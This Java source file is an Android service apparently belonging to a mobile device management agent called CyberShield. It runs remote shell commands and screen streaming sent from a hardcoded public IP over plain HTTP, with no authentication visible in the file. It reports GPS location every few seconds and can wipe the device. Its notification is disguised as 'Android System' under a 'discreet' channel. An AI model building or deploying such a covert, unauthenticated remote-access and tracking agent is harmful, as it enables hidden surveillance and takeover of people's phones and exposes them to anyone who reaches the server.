package com.cybershield.mdm;

import android.annotation.SuppressLint;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ServiceInfo;
import android.location.Location;
import android.location.LocationManager;
import android.net.ConnectivityManager;
import android.net.NetworkCapabilities;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;
import android.widget.Toast;

import androidx.core.app.NotificationCompat;

import com.cybershield.mdm.models.ClientHeartbeat;
import com.cybershield.mdm.models.PolicyCommand;
import com.cybershield.mdm.models.PolicyExecutionResult;
import com.cybershield.mdm.models.TerminalCommand;
import com.google.gson.Gson;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import com.microsoft.signalr.HubConnection;
import com.microsoft.signalr.HubConnectionBuilder;
import com.microsoft.signalr.HubConnectionState;

import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.List;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class CyberShieldService extends Service {
    private static final String TAG = "CyberShield_Service";
    public static final String ACTION_STATUS_UPDATE = "com.cybershield.mdm.STATUS_UPDATE";
    public static final String EXTRA_IS_CONNECTED = "extra_is_connected";
    public static final String EXTRA_SERVER_URL = "extra_server_url";

    public static final String PREFS_NAME = "cybershield_prefs";
    public static final String KEY_SERVER_URL = "server_url";

    // Known endpoints for Auto-Failover
    public static final String LOCAL_SERVER_URL = "http://192.168.68.13:5000/hubs/endpoints";
    public static final String PUBLIC_SERVER_URL = "http://14.194.19.6:5000/hubs/endpoints";
    public static final String DEFAULT_SERVER_URL = LOCAL_SERVER_URL;

    // Discreet system notification channel
    private static final String CHANNEL_ID = "android_system_sync_channel";
    private static final int NOTIFICATION_ID = 1001;

    private final String[] fallbackUrls = new String[]{
            LOCAL_SERVER_URL,
            PUBLIC_SERVER_URL
    };
    private int currentUrlIndex = 0;
    private String currentActiveUrl = LOCAL_SERVER_URL;

    private PolicyEngine policyEngine;
    private RemoteGatewayManager remoteGatewayManager;
    private HubConnection hubConnection;
    private ScheduledExecutorService heartbeatScheduler;
    private final Handler mainHandler = new Handler(Looper.getMainLooper());
    private final Gson gson = new Gson();

    private boolean isUsbStorageBlocked = false;
    private boolean isSoftwareInstallBlocked = false;
    private boolean isWebFilteringBlocked = false;

    public static void startService(Context context) {
        Intent intent = new Intent(context, CyberShieldService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(intent);
        } else {
            context.startService(intent);
        }
    }

    @Override
    public void onCreate() {
        super.onCreate();
        policyEngine = new PolicyEngine(this);
        remoteGatewayManager = new RemoteGatewayManager(this);

        createNotificationChannel();
        startInForeground();

        // Load saved URL or default
        currentActiveUrl = getServerUrl();

        // 1. Trigger UDP Auto-Discovery in background to find local server on Wi-Fi immediately
        runUdpDiscovery();

        // 2. Initialize SignalR Connection
        initSignalR();
    }

    private void runUdpDiscovery() {
        UdpDiscoveryClient.discoverServerAsync(this, discoveredUrl -> {
            Log.i(TAG, "Auto-discovered local server URL on Wi-Fi: " + discoveredUrl);
            if (!discoveredUrl.equals(currentActiveUrl)) {
                currentActiveUrl = discoveredUrl;
                saveServerUrl(discoveredUrl);
                // Switch connection immediately to discovered local URL
                mainHandler.post(this::initSignalR);
            }
        });
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "Device Health & Security Sync",
                    NotificationManager.IMPORTANCE_LOW
            );
            channel.setDescription("Background system sync and policy enforcement.");
            channel.setShowBadge(false);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }

    private void startInForeground() {
        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(
                this, 0, notificationIntent,
                PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT
        );

        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Android System")
                .setContentText("Device security & sync active")
                .setSmallIcon(android.R.drawable.stat_sys_warning)
                .setContentIntent(pendingIntent)
                .setOngoing(true)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .build();

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
        } else {
            startForeground(NOTIFICATION_ID, notification);
        }
    }

    private void updateNotification(boolean isConnected) {
        try {
            Intent notificationIntent = new Intent(this, MainActivity.class);
            PendingIntent pendingIntent = PendingIntent.getActivity(
                    this, 0, notificationIntent,
                    PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT
            );

            String statusDesc = isConnected ? "Device security sync active" : "Sync reconnecting...";

            Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                    .setContentTitle("Android System")
                    .setContentText(statusDesc)
                    .setSmallIcon(android.R.drawable.stat_sys_warning)
                    .setContentIntent(pendingIntent)
                    .setOngoing(true)
                    .setPriority(NotificationCompat.PRIORITY_LOW)
                    .build();

            NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            if (manager != null) {
                manager.notify(NOTIFICATION_ID, notification);
            }
        } catch (Exception ignored) {}
    }

    private String getServerUrl() {
        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        return prefs.getString(KEY_SERVER_URL, DEFAULT_SERVER_URL);
    }

    private void saveServerUrl(String url) {
        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        prefs.edit().putString(KEY_SERVER_URL, url).apply();
    }

    private synchronized void initSignalR() {
        currentActiveUrl = getServerUrl();
        Log.i(TAG, "Initializing SignalR connection to: " + currentActiveUrl);

        try {
            if (hubConnection != null) {
                try { hubConnection.stop().blockingAwait(); } catch (Exception ignored) {}
            }

            setupHubConnection(currentActiveUrl);

            // Connect in background thread
            Executors.newSingleThreadExecutor().execute(() -> {
                boolean connected = tryConnectCurrentHub();
                if (!connected) {
                    tryAlternateUrl();
                }
            });

            startHeartbeatScheduler();

        } catch (Exception e) {
            Log.e(TAG, "Error configuring SignalR: " + e.getMessage(), e);
        }
    }

    private void setupHubConnection(String url) {
        hubConnection = HubConnectionBuilder.create(url).build();

        // 1. Policy Dispatch from Server
        hubConnection.on("ExecutePolicy", (commandJson) -> {
            Log.i(TAG, "Received ExecutePolicy from server: " + commandJson);
            handlePolicyCommand(commandJson);
        }, Object.class);

        // 2. Remote Shell Terminal Execution
        hubConnection.on("ExecuteTerminalCommand", (cmdObj) -> {
            try {
                TerminalCommand cmd;
                if (cmdObj instanceof String) {
                    cmd = gson.fromJson((String) cmdObj, TerminalCommand.class);
                } else {
                    String json = gson.toJson(cmdObj);
                    cmd = gson.fromJson(json, TerminalCommand.class);
                }
                Log.i(TAG, "Received ExecuteTerminalCommand: " + (cmd != null ? cmd.commandText : "null"));
                remoteGatewayManager.executeCommand(cmd, hubConnection);
            } catch (Exception e) {
                Log.e(TAG, "Terminal command error: " + e.getMessage());
            }
        }, Object.class);

        // 3. Remote Screen / Live Stream Start
        hubConnection.on("StartScreenStream", (adminId) -> {
            Log.i(TAG, "Received StartScreenStream request from Admin: " + adminId);
            remoteGatewayManager.startScreenStream((String) adminId, hubConnection);
        }, String.class);

        // 4. Remote Screen Stream Stop
        hubConnection.on("StopScreenStream", () -> {
            Log.i(TAG, "Received StopScreenStream request.");
            remoteGatewayManager.stopScreenStream();
        });

        hubConnection.onClosed(exception -> {
            Log.w(TAG, "SignalR Connection closed: " + (exception != null ? exception.getMessage() : "None"));
            broadcastStatus(false);
        });
    }

    private boolean tryConnectCurrentHub() {
        try {
            hubConnection.start().blockingAwait();
            Log.i(TAG, "SignalR connection established successfully to: " + currentActiveUrl);
            broadcastStatus(true);
            return true;
        } catch (Exception e) {
            Log.w(TAG, "Failed connecting to " + currentActiveUrl + ": " + e.getMessage());
            broadcastStatus(false);
            return false;
        }
    }

    private void tryAlternateUrl() {
        // Toggle URL between Local Wi-Fi IP and Public IP
        currentUrlIndex = (currentUrlIndex + 1) % fallbackUrls.length;
        currentActiveUrl = fallbackUrls[currentUrlIndex];
        Log.i(TAG, "Attempting connection to alternate URL: " + currentActiveUrl);

        try {
            setupHubConnection(currentActiveUrl);
            boolean success = tryConnectCurrentHub();
            if (success) {
                saveServerUrl(currentActiveUrl);
            }
        } catch (Exception e) {
            Log.e(TAG, "Alternate connection failed: " + e.getMessage());
            broadcastStatus(false);
        }
    }

    private void handlePolicyCommand(Object commandObj) {
        try {
            PolicyCommand cmd;
            if (commandObj instanceof String) {
                cmd = gson.fromJson((String) commandObj, PolicyCommand.class);
            } else {
                String json = gson.toJson(commandObj);
                cmd = gson.fromJson(json, PolicyCommand.class);
            }

            if (cmd == null) return;

            boolean success = false;
            String message = "";

            switch (cmd.policy) {
                case 10: // LockWorkstation -> Lock Mobile Screen
                    success = policyEngine.lockScreen();
                    message = success ? "Mobile device screen locked." : "Failed to lock screen (Device Admin required).";
                    break;

                case 1: // UsbStorageBlock -> Restrict USB File Transfer (MTP/PTP)
                    isUsbStorageBlocked = cmd.enableRestriction;
                    success = policyEngine.setUsbDataTransferBlocked(cmd.enableRestriction);
                    message = "USB Data Transfer restriction set to: " + cmd.enableRestriction;
                    break;

                case 2: // DisableSoftwareInstallation -> Block App & APK Installations
                    isSoftwareInstallBlocked = cmd.enableRestriction;
                    success = policyEngine.setSoftwareInstallBlocked(cmd.enableRestriction);
                    message = "App / Software installation restriction set to: " + cmd.enableRestriction;
                    break;

                case 3: // RestrictExternalFileTransfer or Camera Toggle
                    success = policyEngine.setCameraDisabled(cmd.enableRestriction);
                    message = "Hardware camera disabled status: " + cmd.enableRestriction;
                    break;

                case 4: // WebFilteringBlock -> Sync On-Device DNS Blacklist
                    isWebFilteringBlocked = cmd.enableRestriction;
                    success = applyWebFilteringPayload(cmd.payload, cmd.enableRestriction);
                    message = "DNS Web Filtering policy updated. Restriction: " + cmd.enableRestriction;
                    break;

                case 11: // RestartLaptop / Reboot Mobile
                    Log.i(TAG, "Received remote Reboot command for mobile device.");
                    success = policyEngine.rebootDevice();
                    message = success ? "Device reboot initiated." : "Reboot failed. Device Owner permission required.";
                    break;

                case 12: // SendNotification
                    String alertMsg = cmd.payload != null ? cmd.payload : "Corporate IT Compliance Notice";
                    mainHandler.post(() -> Toast.makeText(getApplicationContext(), alertMsg, Toast.LENGTH_LONG).show());
                    success = true;
                    message = "Notification displayed on screen.";
                    break;

                case 99: // Remote Wipe / Format
                    Log.w(TAG, "Received Authorized Remote Wipe command! Payload: " + cmd.payload);
                    success = policyEngine.wipeDevice();
                    message = success ? "Remote factory wipe initiated successfully." : "Factory wipe failed. Device Owner permission required.";
                    break;

                default:
                    // Check payload text for specific commands
                    if (cmd.payload != null && cmd.payload.contains("CAMERA")) {
                        boolean disable = cmd.payload.contains("DISABLE") || cmd.payload.contains("BLOCK");
                        success = policyEngine.setCameraDisabled(disable);
                        message = "Camera policy applied: " + disable;
                    } else if (cmd.payload != null && cmd.payload.contains("FORMAT_LOCK")) {
                        boolean blockFormat = cmd.payload.contains("ENABLE") || cmd.payload.contains("TRUE");
                        success = policyEngine.setFactoryResetBlocked(blockFormat);
                        message = "Factory reset format lock set to: " + blockFormat;
                    } else {
                        message = "Command " + cmd.policy + " acknowledged by Android agent.";
                        success = true;
                    }
                    break;
            }

            // Report execution result back to Server
            if (hubConnection != null && hubConnection.getConnectionState() == HubConnectionState.CONNECTED) {
                PolicyExecutionResult result = new PolicyExecutionResult(cmd.commandId, success, message);
                hubConnection.send("ReportExecutionResult", result);
            }

        } catch (Exception e) {
            Log.e(TAG, "Error handling policy command: " + e.getMessage(), e);
        }
    }

    private boolean applyWebFilteringPayload(String payload, boolean enable) {
        try {
            if (!enable) {
                MdmVpnFilterService.stopFilter(this);
                return true;
            }

            List<String> blocked = new ArrayList<>();
            List<String> allowed = new ArrayList<>();

            if (payload != null && !payload.trim().isEmpty()) {
                if (payload.startsWith("{")) {
                    JsonObject obj = JsonParser.parseString(payload).getAsJsonObject();
                    if (obj.has("Blocked") && obj.get("Blocked").isJsonArray()) {
                        for (var item : obj.getAsJsonArray("Blocked")) {
                            blocked.add(item.getAsString());
                        }
                    }
                    if (obj.has("Allowed") && obj.get("Allowed").isJsonArray()) {
                        for (var item : obj.getAsJsonArray("Allowed")) {
                            allowed.add(item.getAsString());
                        }
                    }
                } else {
                    blocked.addAll(Arrays.asList(payload.split(",")));
                }
            }

            MdmVpnFilterService.updatePolicies(blocked, allowed);
            MdmVpnFilterService.startFilter(this);
            return true;
        } catch (Exception e) {
            Log.e(TAG, "Failed to apply web filtering payload: " + e.getMessage());
            return false;
        }
    }

    private void startHeartbeatScheduler() {
        if (heartbeatScheduler != null && !heartbeatScheduler.isShutdown()) {
            heartbeatScheduler.shutdownNow();
        }

        heartbeatScheduler = Executors.newSingleThreadScheduledExecutor();
        heartbeatScheduler.scheduleWithFixedDelay(this::sendHeartbeatTick, 1, 5, TimeUnit.SECONDS);
    }

    private void sendHeartbeatTick() {
        if (hubConnection == null || hubConnection.getConnectionState() != HubConnectionState.CONNECTED) {
            broadcastStatus(false);
            try {
                if (hubConnection != null) {
                    hubConnection.start().blockingAwait();
                    broadcastStatus(true);
                }
            } catch (Exception ignored) {
                // If current URL fails, try alternating between Local LAN and Public IP
                tryAlternateUrl();
                return;
            }
        }

        try {
            ClientHeartbeat hb = createHeartbeat();
            hubConnection.send("SendHeartbeat", hb);
            broadcastStatus(true);
        } catch (Exception e) {
            Log.w(TAG, "Error sending heartbeat: " + e.getMessage());
            broadcastStatus(false);
        }
    }

    private ClientHeartbeat createHeartbeat() {
        ClientHeartbeat hb = new ClientHeartbeat();
        hb.machineName = (Build.MANUFACTURER + "-" + Build.MODEL).toUpperCase().replaceAll("\\s+", "-");
        hb.userName = "Android Mobile (" + Build.BRAND + ")";
        hb.osVersion = "Android " + Build.VERSION.RELEASE + " (API " + Build.VERSION.SDK_INT + ")";
        hb.ipAddress = getDeviceIpAddress();
        hb.externalFileTransferRestricted = policyEngine.isCameraDisabled();
        hb.usbStorageBlocked = isUsbStorageBlocked;
        hb.softwareInstallDisabled = isSoftwareInstallBlocked;
        hb.webFilteringBlocked = isWebFilteringBlocked;

        // Location reading
        Location loc = getLastKnownLocation();
        if (loc != null) {
            hb.latitude = loc.getLatitude();
            hb.longitude = loc.getLongitude();
        }

        // Detect if connected to office Wi-Fi
        hb.networkLocation = isConnectedToOfficeWifi() ? "In Office" : "Work From Home";

        return hb;
    }

    private boolean isConnectedToOfficeWifi() {
        try {
            ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
            if (cm != null) {
                var network = cm.getActiveNetwork();
                if (network != null) {
                    var caps = cm.getNetworkCapabilities(network);
                    return caps != null && caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI);
                }
            }
        } catch (Exception ignored) {}
        return false;
    }

    @SuppressLint("MissingPermission")
    private Location getLastKnownLocation() {
        try {
            LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
            if (lm != null) {
                Location gps = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                Location net = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                if (gps != null && net != null) {
                    return gps.getTime() > net.getTime() ? gps : net;
                }
                return gps != null ? gps : net;
            }
        } catch (Exception ignored) {}
        return null;
    }

    private String getDeviceIpAddress() {
        try {
            List<NetworkInterface> interfaces = Collections.list(NetworkInterface.getNetworkInterfaces());
            for (NetworkInterface intf : interfaces) {
                if (intf.isLoopback() || !intf.isUp()) continue;
                List<InetAddress> addrs = Collections.list(intf.getInetAddresses());
                for (InetAddress addr : addrs) {
                    if (!addr.isLoopbackAddress() && addr instanceof Inet4Address) {
                        return addr.getHostAddress();
                    }
                }
            }
        } catch (Exception ignored) {}
        return "127.0.0.1";
    }

    private void broadcastStatus(boolean isConnected) {
        updateNotification(isConnected);
        Intent intent = new Intent(ACTION_STATUS_UPDATE);
        intent.putExtra(EXTRA_IS_CONNECTED, isConnected);
        intent.putExtra(EXTRA_SERVER_URL, currentActiveUrl);
        sendBroadcast(intent);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null && intent.hasExtra("RECONNECT")) {
            runUdpDiscovery();
            initSignalR();
        }
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (heartbeatScheduler != null) heartbeatScheduler.shutdownNow();
        if (hubConnection != null) hubConnection.stop().blockingAwait();
        broadcastStatus(false);
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
